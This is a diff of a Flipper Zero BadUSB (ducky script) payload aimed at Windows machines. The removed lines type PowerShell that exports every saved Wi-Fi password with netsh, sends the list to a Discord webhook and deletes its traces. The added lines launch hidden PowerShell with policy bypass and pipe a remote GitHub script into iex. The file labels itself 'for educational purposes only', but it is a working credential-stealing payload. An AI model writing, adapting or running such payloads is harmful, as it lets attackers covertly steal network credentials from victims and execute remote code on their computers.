@@ -1,37 +1,10 @@
-REM This script is a ducky script to be run on a windows machine with a Flipper Zero
-REM It contains a powershell script that exports all saved wifi passwords to a discord webhook
-REM This script is for educational purposes only
-REM To Get Discord Web URL Please visit https://github.com/wmlsandaruwan/FlipperZeroWifiPassStealer
-REM This code is based on a Gist by AlexZeGamer: https://gist.github.com/AlexZeGamer/c7269927335d152cc28d31022c00882e
-REM Modifications were made by W M L Sandaruwan.
+REM     Description: This payload grabs your target's wifi passwords and uploads them to Discord.
+REM     This code is based on a Gist by I-Am-Jakoby: https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-WifiGrabber
+REM     To Get Discord Web URL Please visit https://github.com/wmlsandaruwan/
+REM     This script is for educational purposes only
+REM     Target: Windows 10, 11
 
-REM Opening powershell from the run menu
-    GUI r
-    DELAY 500
-    STRING powershell
-    ENTER
-
-REM Writing the powershell script
-    REM delay of 2 seconds to make sure powershell is open
-    DELAY 2000
-
-    REM Creating a temporary directory and changing to it
-    STRING $p="$env:temp\p";md $p >$null;cd $p;
-
-    REM Exporting all saved wifi passwords to xml files in the temporary directory
-    STRING netsh wlan export profile key=clear >$null;
-
-    REM Getting the names and passwords of all the saved wifi networks from the xml files and storing them in a variable
-    STRING $r=ls|%{$Xml=[xml](gc $_.FullName);[PSCustomObject]@{Name=$Xml.WLANProfile.Name;Password=$Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial}};
-
-    REM Creating the body of the discord webhook message (the message is formatted as a Markdown code block to make it easier to read)
-    STRING $body=@{content="``````"+($r|ft|Out-String)+"``````"};
-
-    REM Sending the body to the discord webhook
-    STRING curl -Uri '<discord webhook>' -Method post -Body $body >$null;
-
-    REM Deleting the temporary directory and exiting powershell
-    STRING cd ..;rm $p -r -fo;exit;
-
-REM Running the powershell script
-    ENTER
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='';irm github.com/wmlsandaruwan/FlipperZeroWifiPassStealer/blob/main/WifiPassStealer.ps1 | iex
+ENTER
